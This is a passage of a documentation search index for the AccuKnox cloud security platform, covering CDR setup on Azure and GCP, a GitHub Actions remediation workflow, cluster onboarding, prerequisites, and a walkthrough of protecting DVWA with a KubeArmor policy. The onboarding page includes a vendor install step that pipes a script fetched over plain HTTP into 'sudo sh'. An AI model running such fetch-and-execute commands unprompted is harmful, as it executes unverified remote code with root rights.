below</p>"},{"location":"getting-started/azure-cdr/#step-1-deploy-the-resources","title":"Step 1: Deploy the resources","text":"<p>In this step we assume you that you are authenticated to Azure via the <code>azure</code> CLI. You can authenticate using this command.</p> <pre><code>az login\n</code></pre> <p>Before applying the Terraform configuration, please update the <code>terraform.tfvars</code> with the appropriate values.</p> Variable Description Default Value Requirement <code>subscription_id</code> Azure account subscription ID Mandatory <code>location</code> Azure location where the resources will be created <code>East US</code> Optional <code>resource_group_name</code> Name of the resource group to be created <code>accuknox-cdr</code> Optional <code>event_hub_namespace_name</code> Name of the event hub namespace to be created <code>accuknox-cdr</code> Optional <code>event_hub_namespace_sku</code> Defines the event hub tier to be used. Possible values: \"Basic\", \"Standard\", \"Premium\" <code>Basic</code> Optional <code>event_hub_namespace_capacity</code> Capacity / throughput units 1 Optional <code>event_hub_name</code> Name of the event hub <code>default</code> Optional <code>event_hub_partition_count</code> Specifies the current number of shards on the Event Hub 1 Optional <code>event_hub_message_retention</code> Specifies the number of days to retain the events for this Event Hub 1 Optional <p>Please run the following commands to deploy the required resources:</p> <p><pre><code>terraform init\nterraform plan\nterraform apply\n</code></pre> Save the terraform output and share it with the AccuKnox Team</p> <p>Important</p> <p>At this point, only the subscription mentioned in the terraform variables will be monitored, to monitor other subscriptions in the account, follow the commands in step 3</p>"},{"location":"getting-started/azure-cdr/#step-2-get-the-eventhub-primary-connection-string","title":"Step 2: Get the EventHub Primary Connection String","text":"<pre><code>terraform output -json\n</code></pre> <p>E.g.,</p> <pre><code>{\n  \"event_hub_primary_connection_string\": {\n    \"sensitive\": true,\n    \"type\": \"string\",\n    \"value\": \"Endpoint=sb://accuknox-cdr.servicebus.windows.net/;SharedAccessKeyName=logstash;SharedAccessKey=REDACTED;EntityPath=default\"\n  },\n  \"event_hub_secondary_connection_string\": {\n    \"sensitive\": true,\n    \"type\": \"string\",\n    \"value\": \"Endpoint=sb://accuknox-cdr.servicebus.windows.net/;SharedAccessKeyName=logstash;SharedAccessKey=REDACTED;EntityPath=default\"\n  }\n}\n</code></pre>"},{"location":"getting-started/azure-cdr/#step-3-monitor-additional-subscriptions","title":"Step 3: Monitor additional subscriptions","text":"<p>You can monitor additional subscriptions in the organization by running the following commands. Before running the script you need to update the values of the the variables.</p> Variable Description <code>SUBSCRIPTION_IDS</code> Azure account subscription IDs to monitor <code>EVENTHUB_AUTH_RULE_ID</code> Can be found in the terraform output of step 1 <code>EVENTHUB_NAME</code> Can be found in the terraform output of step 1 <pre><code># Array of subscription IDs\nSUBSCRIPTION_IDS=(\"sub-11111111-aaaa-bbbb-cccc-111111111111\" \\\n                  \"sub-22222222-aaaa-bbbb-cccc-222222222222\" \\\n                  \"sub-33333333-aaaa-bbbb-cccc-333333333333\")\nEVENTHUB_AUTH_RULE_ID=\"&lt;eventhub-authorization-rule-id&gt;\"\nEVENTHUB_NAME=\"&lt;eventhub-name&gt;\"\n\nDIAGNOSTIC_NAME=\"accuknox-cdr-activity-to-eventhub\"\nfor SUBSCRIPTION_ID in \"${SUBSCRIPTION_IDS[@]}\"; do\n  echo \"Configuring Activity Log \u2192 Event Hub for $SUBSCRIPTION_ID ...\"\n\n  az monitor diagnostic-settings create \\\n    --name $DIAGNOSTIC_NAME \\\n    --resource \"/subscriptions/$SUBSCRIPTION_ID\" \\\n    --event-hub-rule $EVENTHUB_AUTH_RULE_ID \\\n    --event-hub $EVENTHUB_NAME \\\n    --logs '[\n        {\"category\": \"Administrative\", \"enabled\": true},\n        {\"category\": \"Security\", \"enabled\": true},\n        {\"category\": \"ServiceHealth\", \"enabled\": true},\n        {\"category\": \"Alert\", \"enabled\": true},\n        {\"category\": \"Recommendation\", \"enabled\": true},\n        {\"category\": \"Policy\", \"enabled\": true},\n        {\"category\": \"Autoscale\", \"enabled\": true},\n        {\"category\": \"ResourceHealth\", \"enabled\": true}\n    ]'\ndone\n</code></pre>"},{"location":"getting-started/azure-cdr/#next-steps","title":"Next Steps","text":"<p>Provide the connection string to your AccuKnox Point of Contact to start the onboarding process.</p>"},{"location":"getting-started/cdr-setup/","title":"AccuKnox CDR Alert Remediation Setup","text":"<p>Onboarding Steps</p> <p>For Onboarding steps for AWS, Azure and GCP please refer to the following links:</p> <ul> <li>AWS CDR Setup</li> <li>Azure CDR Setup</li> <li>GCP CDR Setup</li> </ul> <p>To remediate alerts the user need to provision the following:</p>"},{"location":"getting-started/cdr-setup/#step-1-cloud-access","title":"Step 1: Cloud Access","text":"<p>Cloud access for the target cloud accounts needs to be provisioned as defined by the table below</p> Cloud Required access Type AWS AdministratorAccess IAM access keys GCP Owner Service Account keys Azure Subscription Owner Service Principal secrets"},{"location":"getting-started/cdr-setup/#step-2-github-repository","title":"Step 2: Github Repository","text":""},{"location":"getting-started/cdr-setup/#github-action-setup","title":"Github action setup","text":"<p>You need to provision a github repository that will serve as the CDR workflow runner.</p> <p>The cloud access keys configured in the previous step needs to be made available as github secrets. Storing cloud access credentials as variables in the workflow is not a secure practice.</p> <p>The github repositry needes to have the following github action implemented</p> <pre><code>name: AWS Remediation\non:\n  repository_dispatch:\n    types: [accuknox-webhook]\n\njobs:\n  remediate:\n    runs-on: ubuntu-latest\n    container:\n      image: public.ecr.aws/k9v9d5v2/cdr/accknox-cdr-remediation:latest\n      env:\n        CLIENT_PAYLOAD: ${{ toJSON(github.event.client_payload) }}\n\n    steps:\n      - name: Accuknox CDR action\n        uses: accuknox/cdr-remediation@v0.0.4\n        with:\n          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_ID }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_KEY }}\n          GOOGLE_CREDENTIALS: ${{ secrets.GCP_SA_KEY }}\n          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}\n          AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}\n          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}\n</code></pre> <p>The above example assumes that we are protecting AWS, GCP and Aure environments using the same repository</p>"},{"location":"getting-started/cdr-setup/#github-fine-grained-access-token","title":"Github Fine Grained Access Token","text":"<p>A github fine grained access token is required with the following permissions:</p> <ul> <li>Contents (R/W)</li> <li>Metadata (R)</li> </ul>"},{"location":"getting-started/cdr-setup/#step-3-accuknox-integration","title":"Step 3: Accuknox Integration","text":"<p>AccuKnox will be triggering the github action configured above via webhook calls to the github apis. For that we need to build the webhook url.</p> <p>The webhook url can be built as follow: <code>https://api.github.com/repos/&lt;github_org_name&gt;/&lt;github_repository_name&gt;/dispatches</code>. where:</p> <ul> <li>github_org_name: The users' github organization</li> <li>github_repository_name: The github repositry configured in the second step</li> </ul> <p>Once you have built the webhook url, please connect to your AccuKnox portal follow the below steps:</p> <ul> <li>Under <code>Settings</code> select <code>Integration</code></li> <li>In the <code>CWPP</code> menu scroll down to the <code>Notification</code> section and select <code>Webhook</code></li> </ul> <p>The webhook will expect the following inputs:</p> <ul> <li>Integration Name: User defined name for the integration</li> <li>Method: Should be set to POST</li> <li>Webhook URL: The webhook url built at the start if this step</li> <li>Success Codes: Should be set to <code>200,204,422</code></li> <li>Test Payload: (optional) Can be left empty</li> <li>Description: (optional) User defined description for the integration</li> <li>Headers: An authorization header is required to authenticate against github api's. The authorization header follows this format:<ul> <li><code>Authorization: token &lt;github_token&gt;</code></li> <li><code>Accept: application/vnd.github+json</code></li> </ul> </li> </ul> <p>where github_token is the github fine-grained access token created on step 2.</p> <p></p> <p>Now we can test and save our integration</p>"},{"location":"getting-started/cdr-setup/#next-steps","title":"Next Steps","text":"<p>Your AccuKnox Point of Contact will guide via the next steps.</p>"},{"location":"getting-started/cluster-onboarding-managed/","title":"Managed Cluster Onboarding","text":"<p>Below shown image is the GKE cluster running with Google Container optimized Operating System.</p> <p></p> <p></p> <p>We can onboard this managed cluster by following the steps shown below:</p> <p>Step 1: After signing up, user will be taken to CNAPP dashboard. Since there is no cluster or cloud account onboarded widgets will not have any data.</p> <p></p> <p>Step 2: Navigate to Manage Cluster from Settings Tab. From this page we can onboard the clusters running in various cloud platforms like GCP,AWS and Azure. We can also onboard unmanaged cluster set up locally in the on-premise environment or virtual machines. To onboard cluster select onboard now option</p> <p></p> <p>Step 3: In this screen, give any name to the cluster that you are going to onboard now.</p> <p></p> <p>step 4: Onboarded Cluster without AccuKnox agents:</p> <p>The onboarded cluster\u2019s workload details will not be visible as we have not installed AccuKnox agents. So next we will be installing AccuKnox agents.</p> <p></p> <p>Step 5: Installing KubeArmor and AccuKnox agents:</p> <p>We are going to install KubeArmor and AccuKnox-agents to connect to the AccuKnox SaaS application.</p> <p>Step 5.1: KubeArmor Installation:</p> <p>KubeArmor:</p> <p>KubeArmor is a cloud-native runtime security enforcement system that restricts the behavior (such as process execution, file access, and networking operation) of containers and nodes at the system level. With KubeArmor, a user can:</p> <ul> <li> <p>Restrict file system access for certain processes</p> </li> <li> <p>Restrict what processes can be spawned within the pod</p> </li> <li> <p>Restrict the capabilities that can be used by the processes within the pod</p> </li> </ul> <p>KubeArmor differs from seccomp-based profiles, wherein KubeArmor allows to dynamically set the restrictions on the pod. With seccomp, the restrictions must be placed during the pod startup and cannot be changed later. KubeArmor leverages Linux Security Modules (LSMs) to enforce policies at runtime.</p> <p></p> <p>KubeArmor is installed using the following commands:</p> <pre><code>&gt;&gt; curl -sfL http://get.kubearmor.io/ | sudo sh -s -- -b /usr/local/bin\n&gt;&gt; karmor install\n</code></pre> <p>Sample Output:</p> <pre><code>***********@cloudshell:- (smooth-zenith-382113)$ curl -sfL http://get.kubearmor.io/ | sudo sh s b /usr/local/bin\nkubearmor/kubearmor-client info checking GitHub for latest tag\nkubearmor/kubearmor-client info found version: 0.12.4 for v0.12.4/linux/amd84\nkubearmor/kubearmor-client info installed /usr/local/bin/karmor\n***********@cloudshell:- (smooth-zenith-382113)$ karmor install\nAuto Detected Environment : gke\nCRD kubearmorpolicies.security.kubearmor.com\nCRD kubearmorhostpolicies.security.kubearmor.com\nService Account\nCluster Role Bindings\nKubeArmor Relay Service\nKubeArmor Relay Deployment\nKubeArmor DaemonSet - Init kubearmor/kubearmor-init:stable, Container kubearmor/kubearmor:stable-gRPC=22767\nKubeArmor Policy Manager Service\nKubeArmor Policy Manager Deployment\nKubeArmorrHost Policy Manager Service\nKubeArmor Host Policy Manager Deployment\nKubeArmor Annotation Controller TLS certificates\nKubeArmorrAnnotationgcontroller Deployment\nKubeArmorrAnnotationgcontroller Service\nKubeArmor Annotation Controller Mutation Admission Registration\nDone Installing RubeArmor\nDone Checking tALL Services are\\running!\nExecution Time : 43.880558117s\n</code></pre> <p>Step 5.2: AccuKnox-Agents installation:</p> <p>After installing KubeArmor we are going to install AccuKnox Agents in the cluster.</p> <p>AccuKnox Agents:</p> <p>1.KubeArmor: KubeArmor is a cloud-native runtime security enforcement system that restricts the behavior (such as process execution, file access, and networking operation) of containers and nodes at the system level. KubeArmor dynamically set the restrictions on the pod. KubeArmor leverages Linux Security Modules (LSMs) to enforce policies at runtime.</p> <p>2.Feeder Service: It collects the feeds from kubeArmor and relays to the app.</p> <p>3.Shared Informer Agent: It collects information about the cluster like pods, nodes, namespaces etc.,</p> <p>4.Policy Discovery Engine: It discovers the policies using the workload and cluster information that is relayed by a shared informer Agent.</p> <p></p> <p>AccuKnox Agents can be installed using the following command:</p> <pre><code>    helm upgrade --install accuknox-agents oci://public.ecr.aws/k9v9d5v2/accuknox-agents \\\n      --version \"v0.2.6\" \\\n      --set joinToken=\"***********-***********-***********\" \\\n      --set spireHost=\"spire.demo.accuknox.com\" \\\n      --set ppsHost=\"pps.demo.accuknox.com\" \\\n      --set knoxGateway=\"knox-gw.demo.accuknox.com:3000\" \\\n      -n accuknox-agents --create-namespace\n</code></pre> <p>Sample Output:</p> <pre><code>***********@cloudshell:- (smooth-zenith-382113)$     helm upgrade --install accuknox-agents oci://public.ecr.aws/k9v9d5v2/accuknox-agents \\\n      --version \"v0.2.6\" \\\n      --set joinToken=\"***********-***********-***********\" \\\n      --set spireHost=\"spire.demo.accuknox.com\" \\\n      --set ppsHost=\"pps.demo.accuknox.com\" \\\n      --set knoxGateway=\"knox-gw.demo.accuknox.com:3000\" \\\n      -n accuknox-agents --create-namespace\n\"accuknox-agents\" has been added to your repositories\nHang tight while we grab the latest from your chart repositories...\n...Succssfully got an update from the \"accuknox-agents\" chart repository\nUpdate Complete. *Happy Helming!*\nRelease \"agents-operator\" does not exist. Installing it now.\nNAME: agents-operator\nLAST DEPLOYED: Wed Mar 29 14:41:20 2023\nNAMESPACE: accuknox-agents\nSTATUS: deployed\nREVISION: 1\nTEST SUITE: None\n</code></pre> <p>Note: In the above command joinToken is specific to this example and it will vary based on the cluster</p> <p>Step 6: After installing all the AccuKnox agents the cluster is onboarded successfully into the SaaS application. We can see the workload details of the onboarded cluster by Navigating to Inventory\u2192cloud Workloads option</p> <p></p> <p>SCHEDULE DEMO</p>"},{"location":"getting-started/cspm-prereq-aws/","title":"CSPM Pre-requisite for AWS","text":"<p>In SaaS model of deployment the AccuKnox CNAPP will be hosted in our cloud environment and scan will be done using the Cloud account Readonly Access permission.</p> <p></p> <p>AWS onboarding requires creation of an IAM user. Please follow the following steps to provide a user with appropriate read access:</p> <p>Step 1: Navigate to IAM \u2192 Users and click on Add Users</p> <p></p> <p>Step 2: Give a username to identify the user</p> <p></p> <p>Step 3: In the \"Set Permissions\" screen:</p> <p>a. Select \"Attach policies directly\"</p> <p>b. Search \"ReadOnly\", Filter by Type: \"AWS managed - job function\" and select the policy</p> <p></p> <p>c. Search \"SecurityAudit\", Filter by Type: \"AWS managed - job function\" and select the policy</p> <p></p> <p>Step 4: Finish creating the user. Click on the newly created user and create the Access key and Secret Key from the Security Credentials tab to be used in the AccuKnox panel</p> <p></p> <p>SCHEDULE DEMO</p>"},{"location":"getting-started/cwpp-prereq/","title":"CWPP Pre-requisites","text":"<p>In SaaS model of deployment the AccuKnox CNAPP will be hosted in our cloud environment and the agents deployed on the workloads will connect with the SaaS.</p> <p></p>"},{"location":"getting-started/cwpp-prereq/#accuknox-agents","title":"AccuKnox Agents","text":"Deployments Deployment Type KubeArmor DaemonSet Shared Informer Agent Deployment Feeder Service Deployment Policy Enforcement Deployment Discovery Engine Agent Deployment <ul> <li> <p>It is assumed that the user has some basic familiarity with Kubernetes, kubectl and helm. It also assumes that you are familiar with the AccuKnox opensource tool workflow. If you're new to AccuKnox itself, refer first to opensource installation</p> </li> <li> <p>It is recommended to have the following configured before onboarding:</p> <ol> <li>Kubectl</li> <li>Helm</li> </ol> </li> </ul>"},{"location":"getting-started/cwpp-prereq/#pre-requisites","title":"Pre-requisites","text":""},{"location":"getting-started/cwpp-prereq/#minimum-resource-required","title":"Minimum Resource required","text":"Deployments Resource Usage Ports Connection Type AccuKnox Endpoint KubeArmor CPU: 200 m, Memory: 200 Mi - - - Agents Operator CPU: 50 m, Memory: 50 Mi 8081, 9090 Outbound *.accuknox.com:8081 -\u2192 SPIRE Access *.accuknox.com:9090 -\u2192 SPIRE Health Check Discovery Engine CPU: 200 m, Memory: 200 Mi - - - Shared Informer Agent CPU: 20 m, Memory: 50 Mi 3000 Outbound *.accuknox.com:3000 -\u2192 knox-gateway Feeder Service CPU: 50 m, Memory: 100 Mi 3000 Outbound *.accuknox.com:3000 -\u2192 knox-gateway Policy Enforcement CPU: 10 m, Memory: 20 Mi 443 Outbound *.accuknox.com:443  -\u2192 Policy Provider Service <ul> <li>These ports need to be allowed through firewall.</li> </ul> <p>SCHEDULE DEMO</p>"},{"location":"getting-started/deployment-models/","title":"Deployment Models","text":"<p>AccuKnox has an expanded offering to cater to diverse deployment needs and preferences:</p> <p></p> <ol> <li> <p>AccuKnox SaaS - This is our go-to mainstream offering designed for production environments. It provides seamless and scalable security solutions through a SaaS model, ensuring ease of use and quick deployment.</p> </li> <li> <p>AccuKnox Managed OEM/MSSP - This model is tailored for managed deployments where AccuKnox oversees upgrades and maintenance while keeping the OEM/MSSP informed. This ensures that our partners, such as Xcitium, can rely on us for smooth operations and continuous improvements without losing control over the deployment.</p> </li> <li> <p>AWS On-prem - In this deployment, we leverage managed services from AWS, including S3, RDS, and others, to provide a hybrid solution combining cloud and on-premises deployments. This setup ensures optimal performance and scalability while utilizing AWS's robust infrastructure.</p> </li> <li> <p>Full On-prem/Air-Gapped-\u00a0 For environments requiring maximum security and isolation, we offer full on-premises or air-gapped deployments. This ensures that all data and operations remain within the customer's premises, providing the highest level of control and security, suitable for sensitive and regulated industries.</p> </li> </ol> Feature SaaS On-Prem Upgrade and Maintenance to AccuKnox Control Plane Managed by AccuKnox Customer managed with AccuKnox support. Technical Support Users can choose AccuKnox Premium support needed Air Gapped? No Optionally yes Raw Data Retention Period AccuKnox Managed (default 60 days) Customer managed Velocity of Feature Updates Fast. New features are available much faster. Customer needs to decide. For security updates, AccuKnox will provide upgrade patches. The patches are applied by the customer DevOps team with AccuKnox support. Typically the release cadence is once per month. Security/Isolation Shared resources with other customers No sharing of resources. Except customer DevOps team, no one has direct access to the deployment. What Features are Supported? All Except AI CoPilot (AskADA), everything else. <p>By offering these diverse deployment options, you can choose the model that best fits your operational needs and security requirements.</p>"},{"location":"getting-started/devsecops/","title":"DevSecOps","text":""},{"location":"getting-started/devsecops/#overview","title":"Overview","text":"<p>AccuKnox integrates seamlessly into your CI/CD pipeline to provide robust, agentless scanning capabilities, supporting a Shift-Left Security approach. By embedding security checks early in the software development lifecycle, AccuKnox enables developers to identify and remediate vulnerabilities, misconfigurations, and other security issues directly within their development tools and pipelines. The agentless scans run efficiently without requiring additional installations and can be configured to break pipelines when critical vulnerabilities are detected, ensuring that insecure code does not progress further. This proactive approach reduces the risks and costs associated with addressing issues late in the process while fostering secure, agile development.</p>"},{"location":"getting-started/devsecops/#types-of-scanning","title":"Types of Scanning","text":"Scan Type Description Static Application Security Testing (SAST) Scans application source code to detect security issues early in the development lifecycle. Dynamic Application Security Testing (DAST) Identifies vulnerabilities in running applications during real-world execution. Software Composition Analysis (SCA) Detects vulnerabilities in third-party libraries and open-source dependencies. Infrastructure as Code (IaC) Scanning Verifies that infrastructure configurations comply with security best practices and standards. Container Image Scanning Scans container images for security vulnerabilities, misconfigurations, and compliance issues before deployment."},{"location":"getting-started/devsecops/#supported-cicd-pipelines","title":"Supported CI/CD Pipelines","text":"<p>AccuKnox supports integration with a wide range of CI/CD tools, enabling smooth adoption across various workflows, including on-premise pipelines.</p> <ul> <li> <p>Workflow: A workflow integrates AccuKnox directly into the CI/CD pipeline, where security scans are triggered automatically as part of the build process. No additional installation is needed beyond pipeline configuration.</p> </li> <li> <p>Plugin: A plugin is an add-on module that integrates AccuKnox with a specific CI/CD tool. It simplifies the setup by allowing security scans to run within the pipeline with minimal configuration.</p> </li> </ul> Pipeline/Tool Supported Azure DevOps Workflow Google Cloud Build Workflow Harness Workflow Jenkins Plugin / Workflow AWS CodePipeline Workflow GitHub Plugin / Workflow GitLab Plugin / Workflow Bitbucket Plugin / Workflow"},{"location":"getting-started/devsecops/#scanner-integrations","title":"Scanner Integrations","text":"<p>AccuKnox seamlessly integrates with leading, industry-recognized scanning tools to deliver comprehensive security coverage. By leveraging scanners such as OWASP ZAP, SonarQube, and other tools, it performs the following analyses:</p> <ul> <li> <p>Scanning source code for vulnerabilities (SAST).</p> </li> <li> <p>Assessing running applications for security flaws (DAST).</p> </li> <li> <p>Identifying risks in dependencies (SCA).</p> </li> <li> <p>Evaluating cloud and container configurations for security gaps (IaC Scanning).</p> </li> </ul> <p>This agentless approach simplifies operations and ensures real-time security feedback without disrupting the development process.</p> <p></p>"},{"location":"getting-started/devsecops/#data-insights-and-automation","title":"Data Insights and Automation","text":"<p>AccuKnox consolidates all parsed data such as vulnerabilities, misconfigurations, and compliance violations into a unified dashboard. This enables quick visualization and actionable insights, allowing teams to prioritize and address issues effectively.</p> <p>Key features include:</p> <ol> <li> <p>Automated Alerts: Instantly notifies teams of critical issues through email, Slack, or other communication channels.</p> </li> <li> <p>Ticket Creation: Automatically logs issues into ticketing tools like JIRA, ServiceNow, FreshService etc streamlining incident tracking and resolution.</p> </li> <li> <p>Remediation Guidance: Offers actionable recommendations to fix detected issues efficiently.</p> </li> </ol> <p>By integrating these capabilities, AccuKnox simplifies and strengthens DevSecOps implementation, empowering organizations to deliver secure, high-quality software at speed.</p>"},{"location":"getting-started/dvwa/","title":"Damn Vulnerable Web Applications with AccuKnox CWPP","text":"<p>Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application designed to be damn vulnerable. It serves as a resource for security professionals to test their skills and tools in a legal environment, helps web developers understand the processes of securing web applications, and aids students &amp; teachers in learning about web application security in a controlled classroom setting.</p>"},{"location":"getting-started/dvwa/#1-prerequisites-setup","title":"1. Prerequisites &amp; Setup","text":""},{"location":"getting-started/dvwa/#system-requirements","title":"System Requirements","text":"<p>To deploy and secure DVWA with AccuKnox CWPP, ensure the following:</p> <ul> <li>Kubernetes cluster running</li> <li>Access to the AccuKnox platform</li> <li>DVWA image pulled from Docker Hub</li> <li>kubectl configured with appropriate permissions</li> </ul>"},{"location":"getting-started/dvwa/#initial-dvwa-deployment-steps","title":"Initial DVWA Deployment Steps","text":"<ol> <li>Deploy the DVWA application in your cluster within the <code>dvwa</code> namespace.</li> <li>Ensure both the Web and MySQL pods are running with their respective services.</li> </ol>"},{"location":"getting-started/dvwa/#accuknox-platform-access-requirements","title":"AccuKnox Platform Access Requirements","text":"<ul> <li>Active AccuKnox CWPP subscription.</li> <li>Cluster and namespace added to the AccuKnox platform.</li> </ul>"},{"location":"getting-started/dvwa/#2-dvwa-vulnerability-testing-integration","title":"2. DVWA Vulnerability Testing Integration","text":""},{"location":"getting-started/dvwa/#dvwa-attack-points","title":"DVWA Attack Points","text":"<ul> <li>Command Injection: Exploiting insecure user data transmission.</li> <li>CSRF (Cross-Site Request Forgery): Forging links to steal cookies or form data.</li> <li>SQL Injection: Unauthorized database access.</li> <li>CSP (Content Security Policy): Executing malicious scripts from allowed domains.</li> </ul> <p>DVWA web application is deployed in the cluster in the <code>dvwa</code> namespace with both Web and MySQL pods running.</p>"},{"location":"getting-started/dvwa/#how-accuknox-protects-against-specific-dvwa-attack-vectors","title":"How AccuKnox Protects Against Specific DVWA Attack Vectors","text":"<p>Once the cluster with the DVWA application is onboarded, navigate to Runtime Security \u2192 App Behavior in AccuKnox to observe application behavior.</p> <p></p>"},{"location":"getting-started/dvwa/#real-time-attack-detection-examples","title":"Real-time Attack Detection Examples","text":"<p>1. Network Observability: Data on network connections within the pod. </p> <p>2. File Observability: Information on files accessed in the pod. </p> <p>3. Process Observability: Insights on processes executed in the pod. </p>"},{"location":"getting-started/dvwa/#3-policy-configuration-details","title":"3. Policy Configuration Details","text":""},{"location":"getting-started/dvwa/#policy-customization-options","title":"Policy Customization Options","text":"<p>According to the application behavior, the DVWA pod uses processes like <code>ping</code> and <code>apache2</code>. These processes can be whitelisted to block any other unauthorized executions.</p>"},{"location":"getting-started/dvwa/#understanding-policy-severity-levels","title":"Understanding Policy Severity Levels","text":"<p>AccuKnox CWPP policies allow you to set severity levels to prioritize blocking based on risk.</p>"},{"location":"getting-started/dvwa/#best-practices-for-policy-creation","title":"Best Practices for Policy Creation","text":"<ul> <li>Whitelist only required processes and files.</li> <li>Regularly review and approve pending policies.</li> </ul>"},{"location":"getting-started/dvwa/#4-monitoring-analysis","title":"4. Monitoring &amp; Analysis","text":""},{"location":"getting-started/dvwa/#alert-investigation-workflow","title":"Alert Investigation Workflow","text":"<p>Monitor alerts by navigating to Monitors/Logs \u2192 Logs in the AccuKnox dashboard. </p>"},{"location":"getting-started/dvwa/#performance-impact-assessment","title":"Performance Impact Assessment","text":"<p>Assess DVWA pod performance post-policy enforcement to ensure there are no disruptions.</p>"},{"location":"getting-started/dvwa/#compliance-reporting","title":"Compliance Reporting","text":"<p>Use the platform\u2019s reporting feature to validate compliance with organizational or regulatory security standards.</p>"},{"location":"getting-started/dvwa/#5-protection-workflow-with-accuknox-cwpp","title":"5. Protection Workflow With AccuKnox CWPP","text":""},{"location":"getting-started/dvwa/#before-applying-policy","title":"Before Applying Policy","text":"<p>Initially, all processes can be executed inside the DVWA pod. </p>"},{"location":"getting-started/dvwa/#applying-kubearmor-policy","title":"Applying KubeArmor Policy","text":"<ol> <li> <p>Navigate to Runtime Protection \u2192 Policies in the AccuKnox UI.    </p> </li> <li> <p>View auto-discovered policies for the DVWA application.    </p> </li> <li> <p>Select and review the system policy for the <code>dvwa-web</code> pod.    </p> </li> </ol> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: autopol-system-1804736057\n  namespace: dvwa\nspec:\n  action: Allow\n  file:\n    matchDirectories:\n      - dir: /etc/\n        fromSource:\n          - path: /bin/bash\n        recursive: true\n      - dir: /lib/x86_64-linux-gnu/\n        recursive: true\n      - dir: /etc/\n        fromSource:\n          - path: /bin/bash\n          - path: /bin/ping\n        recursive: true\n    matchPaths:\n      - fromSource:\n          - path: /bin/bash\n        path: /dev/tty\n      - fromSource:\n          - path: /bin/bash\n        path: /lib/terminfo/x/xterm\n      - fromSource:\n          - path: /bin/bash\n        path: /root/.bashrc\n      - fromSource:\n          - path: /bin/ping\n        path: /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache\n      - fromSource:\n          - path: /bin/ping\n        path: /usr/lib/x86_64-linux-gnu/libidn2.so.0.3.7\n      - fromSource:\n          - path: /bin/ping\n        path: /usr/lib/x86_64-linux-gnu/libunistring.so.2.1.0\n      - fromSource:\n          - path: /usr/sbin/apache2\n        path: /etc/ld.so.cache\n      - fromSource:\n          - path: /usr/sbin/apache2\n        path: /usr/lib/x86_64-linux-gnu/libapr-1.so.0.7.0\n      - fromSource:\n          - path: /usr/sbin/apache2\n        path: /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0.6.1\n      - fromSource:\n          - path: /usr/sbin/apache2\n        path: /usr/lib/x86_64-linux-gnu/libuuid.so.1.3.0\n      - fromSource:\n          - path: /usr/sbin/apache2\n        path: /usr/share/zoneinfo/Etc/UTC\n      - fromSource:\n          - path: /bin/bash\n        path: /root/.bash_history\n  process:\n    matchPaths:\n      - path: /bin/bash\n      - fromSource:\n          - path: /bin/bash\n        path: /bin/ping\n      - fromSource:\n          - path: /bin/bash\n        path: /usr/sbin/apache2\n  selector:\n    matchLabels:\n      app: dvwa-web\n      tier: frontend\n  severity: 1\n</code></pre> <ol> <li> <p>Apply the policy.    </p> </li> <li> <p>Policy enters pending state for approval.    </p> </li> <li> <p>Review and approve the policy.    </p> </li> <li> <p>Once approved, the policy becomes active.    </p> </li> <li> <p>Any other processes executed in the DVWA pod will now be blocked.    </p> </li> </ol>"},{"location":"getting-started/dvwa/#6-troubleshooting","title":"6. Troubleshooting","text":""},{"location":"getting-started/dvwa/#common-policy-application-issues","title":"Common Policy Application Issues","text":"<ul> <li>Policies not applying due to namespace mismatch.</li> <li>Pod label selectors not configured correctly.</li> </ul>"},{"location":"getting-started/dvwa/#log-analysis-techniques","title":"Log Analysis Techniques","text":"<p>Use Monitors/Logs to investigate policy hits and blocked executions.</p>"},{"location":"getting-started/dvwa/#performance-optimization","title":"Performance Optimization","text":"<p>Tune policy settings to balance security and application performance.</p>"},{"location":"getting-started/dvwa/#7-advanced-use-cases","title":"7. Advanced Use Cases","text":""},{"location":"getting-started/dvwa/#multi-environment-deployment","title":"Multi-Environment Deployment","text":"<p>Deploy DVWA with AccuKnox protection across multiple clusters and environments for testing.</p>"},{"location":"getting-started/dvwa/#integration-with-cicd-pipelines","title":"Integration with CI/CD Pipelines","text":"<p>Incorporate DVWA vulnerability scans and AccuKnox policy enforcement into your CI/CD workflows for DevSecOps.</p> <p>Thus, the DVWA application\u2019s web pod is protected using the AccuKnox CWPP security solution.</p> <p>SCHEDULE DEMO</p>"},{"location":"getting-started/gcp-cdr/","title":"AccuKnox CDR for GCP \u2013 Deployment &amp; Setup Guide","text":"<p>Remediation Setup</p> <p>For remediation setup for AWS, Azure and GCP CDR please refer to the following links:</p> <ul> <li>Remediate Alerts</li> </ul>"},{"location":"getting-started/gcp-cdr/#introduction","title":"Introduction","text":"<p>AccuKnox CDR for GCP is deployed using terraform scripts, the scripts deployes the following resources:</p> Resource Purpose Log Sink Routes Logs to a Sink Pub/Sub Topic Recieves logs from Log Sink Pub/Sub Subscription Consumers subscribes to the Log sent by the Log sink Service Account Service account to subscribe to the Pub/Sub subscription <p>In addition, the scripts will enable the following API's if they are disabled:</p> <ul> <li>pubsub.googleapis.com</li> <li>iam.googleapis.com</li> <li>logging.googleapis.com</li> </ul> <p>The terraform script will be provided to you by AccuKnox team in the onboarding phase.</p> <p></p>"},{"location":"getting-started/gcp-cdr/#setup","title":"Setup","text":"<p>To setup the integration please follow the steps below</p>"},{"location":"getting-started/gcp-cdr/#step-1-deploy-the-resources","title":"Step 1: Deploy the resources","text":"<p>In this step we assume you that you are authenticated to GCP via CLI. You can authenticate using this command.</p> <pre><code>gcloud auth application-default login\n</code></pre> <p>Before applying the terraform scripts, please update the <code>terraform.tfvars</code> with the appropriate values</p> Variable Description Default Value Requirement <code>project_id</code> GCP project ID to create the the resources in. Mandatory <code>projects</code> GCP projects to monitor Mandatory <code>org_id</code> GCP organization ID Mandatory <code>region</code> Any valid GCP region (required by the Terraform provider) Mandatory <code>pubsub_topic_name</code> Pub/Sub Topic name <code>accuknox-siem</code> Optional <code>subscription_name</code> Pub/Sub Subscription name <code>accuknox-siem-sub</code> Optional <code>service_account_id</code> Service Account name <code>accuknox-cdr-pubsub-reader</code> Optional <code>sink_name</code> Log Sink name <code>accuknox-audit-logs-to-pubsub</code> Optional <p>Please run the following commands to deploy 